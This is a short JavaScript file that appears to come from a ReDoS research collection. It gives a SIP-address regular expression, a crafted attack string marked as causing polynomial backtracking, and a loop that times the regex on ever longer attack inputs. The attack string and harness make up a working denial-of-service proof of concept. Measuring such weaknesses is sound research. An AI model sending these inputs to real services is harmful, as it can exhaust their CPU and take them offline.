/* 8294
 * ^(sip|sips):.*\@((\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})|([a-zA-Z\-\.]+\.[a-zA-Z]{2,5}))(:[\d]{1,5})?([\w\-?\@?\;?\,?\=\%\&]+)?
 * POLYNOMIAL
 * nums:3
 * POLYNOMIAL AttackString:"sip:@11"+"0000"*80000+"! _1_POA(i)"
 */
var REGEX = /^(sip|sips):.*\@((\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})|([a-zA-Z\-\.]+\.[a-zA-Z]{2,5}))(:[\d]{1,5})?([\w\-?\@?\;?\,?\=\%\&]+)?/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'sip:@11' + '0000'.repeat(i*10000) + '! _1_POA(i)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 10000 + ": " + time_cost+" ms")
}